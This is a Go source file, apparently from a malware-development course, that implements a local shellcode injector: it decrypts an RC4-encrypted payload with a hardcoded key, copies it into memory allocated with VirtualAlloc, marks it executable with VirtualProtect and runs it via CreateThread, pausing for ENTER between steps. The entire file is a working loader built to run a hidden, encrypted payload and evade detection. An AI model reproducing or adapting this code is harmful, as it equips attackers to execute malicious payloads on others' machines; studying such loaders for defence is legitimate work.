package main

import (
	"fmt"
	"os"
	"unsafe"

	"github.com/mortimus/maldev/pkg/maldev"
	"github.com/mortimus/maldev/pkg/shellcode"
)

var key []byte = []byte("J7dwJZIbgcQ9HdzHwPKeI8yvFKbzK6iH")
var encryptedData = []byte{
	0x4E, 0xAF, 0x9D, 0x61, 0x54, 0x50, 0x2A, 0x11, 0x6C, 0x2E, 0x53, 0x36, 0x81, 0xE6, 0xD7, 0x01,
	0x0E, 0x75, 0x19, 0x49, 0xAF, 0x5C, 0x84, 0x04, 0x39, 0xFA, 0xA6, 0x9F, 0x35, 0x93, 0xFE, 0x7E,
	0xEF, 0xBC, 0x3C, 0xA6, 0x64, 0xED, 0x3B, 0x26, 0x4A, 0xB1, 0xD5, 0x2A, 0x77, 0x71, 0x70, 0x21,
	0x6B, 0x24, 0xF4, 0xAE, 0x97, 0x80, 0x62, 0xB7, 0x3A, 0xE5, 0xA5, 0x31, 0x55, 0x66, 0x40, 0xE0,
	0x3C, 0x48, 0x33, 0x61, 0x20, 0x28, 0xC9, 0x6C, 0xBA, 0xD1, 0xE0, 0xEB, 0x22, 0x4A, 0x78, 0x7B,
	0xEC, 0x65, 0xA7, 0xFA, 0x6E, 0x0D, 0x0B, 0xF7, 0x7F, 0x05, 0xB4, 0x33, 0x67, 0x16, 0xAD, 0xCD,
	0xBD, 0x16, 0x83, 0x7E, 0x70, 0x58, 0xDC, 0x49, 0xE7, 0x11, 0x3B, 0x01, 0x62, 0xBC, 0xB9, 0xED,
	0x8F, 0x92, 0xB1, 0xAB, 0x76, 0xBF, 0x2D, 0x25, 0x05, 0xF0, 0x9B, 0x31, 0xE1, 0x07, 0xF3, 0x6E,
	0x33, 0x52, 0xE9, 0x45, 0xDA, 0x3E, 0x68, 0xEF, 0x6B, 0xEF, 0x9E, 0x1E, 0x1A, 0xF9, 0xD3, 0xDB,
	0x00, 0x00, 0x48, 0x0D, 0xE3, 0xF4, 0x69, 0x11, 0xEF, 0x9C, 0x24, 0x49, 0xD4, 0x29, 0x37, 0x25,
	0x45, 0xCC, 0xB1, 0x71, 0x21, 0xF6, 0xB8, 0x80, 0xA0, 0x14, 0x2B, 0xB6, 0xEA, 0xC4, 0x4B, 0xA8,
	0x37, 0x25, 0x6A, 0x63, 0x44, 0xC0, 0xDF, 0x10, 0x5A, 0x53, 0xB3, 0x65, 0xFD, 0x25, 0x12, 0xF8,
	0x63, 0x0B, 0x91, 0x6C, 0x05, 0x34, 0xDB, 0xAC, 0xA2, 0x95, 0xCA, 0x46, 0x68, 0xA9, 0x41, 0x68,
	0x17, 0x58, 0xE6, 0x5B, 0xC7, 0x1E, 0x91, 0x54, 0x3F, 0x76, 0xF5, 0x73, 0x9B, 0xE2, 0x59, 0x0C,
	0x14, 0x31, 0x13, 0x93, 0x53, 0xA8, 0x9C, 0xA1, 0x1F, 0x54, 0x61, 0x3E, 0x6E, 0xB9, 0xD6, 0xCA,
	0x34, 0x44, 0x0E, 0x71, 0xEB, 0x9C, 0x00, 0x43, 0x94, 0xE3, 0x6C, 0xCC, 0x9A, 0xB5, 0x82, 0x31,
	0x1C, 0xA7, 0x05, 0xB1, 0x28, 0xF3, 0x98, 0xA1, 0x39, 0x4D, 0xFB, 0x35, 0x93, 0xF4, 0x2D, 0x03,
	0xA0, 0x04, 0xF0, 0x28,
}

func main() {
	shellcode.Print("Encrypted Shellcode", 0, encryptedData)
	fmt.Printf("[i] Injecting Shellcode into the local process of PID %d\n", os.Getpid())
	fmt.Printf("[#] Press <ENTER> to Decrypt\n")
	fmt.Scanln()
	fmt.Printf("[i] Decrypting Shellcode\n")
	// DECRYPT SHELLCODE
	decrypted := maldev.RC4(encryptedData, key)
	shellcode.Print("Decrypted Shellcode", 0, decrypted)
	fmt.Printf("[#] Press <ENTER> to Allocate\n")
	fmt.Scanln()
	// ALLOCATE MEMORY
	addr, err := maldev.VirtualAlloc(0, maldev.SIZE_T(len(decrypted)), maldev.MEM_COMMIT|maldev.MEM_RESERVE, maldev.PAGE_READWRITE)
	if err != nil {
		fmt.Printf("[!] VirtualAlloc Failed With Error : %s \n", err)
		return
	}
	fmt.Printf("[i] Allocated Memory At : 0x%p \n", unsafe.Pointer(addr))
	fmt.Printf("[#] Press <Enter> To Write Payload ... ")
	fmt.Scanln()
	// WRITE SHELLCODE
	maldev.Memcpy(unsafe.Pointer(addr), unsafe.Pointer(&decrypted[0]), maldev.SIZE_T(len(decrypted)))
	maldev.Memset(unsafe.Pointer(&decrypted[0]), 0, maldev.SIZE_T(len(decrypted)))

	var dwOldProtection maldev.DWORD
	_, err = maldev.VirtualProtect(addr, maldev.SIZE_T(len(decrypted)), maldev.PAGE_EXECUTE_READWRITE, &dwOldProtection)
	if err != nil {
		fmt.Printf("[!] VirtualProtect Failed With Error : %s \n", err)
		return
	}
	fmt.Printf("[#] Press <Enter> To Run ... ")
	fmt.Scanln()

	_, err = maldev.CreateThread(0, 0, maldev.LPTHREAD_START_ROUTINE(addr), 0, 0, nil)
	if err != nil {
		fmt.Printf("[!] CreateThread Failed With Error : %s \n", err)
		return
	}
	// HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	decrypted = nil
	fmt.Printf("[#] Press <Enter> To Quit ...")
	fmt.Scanln()
}
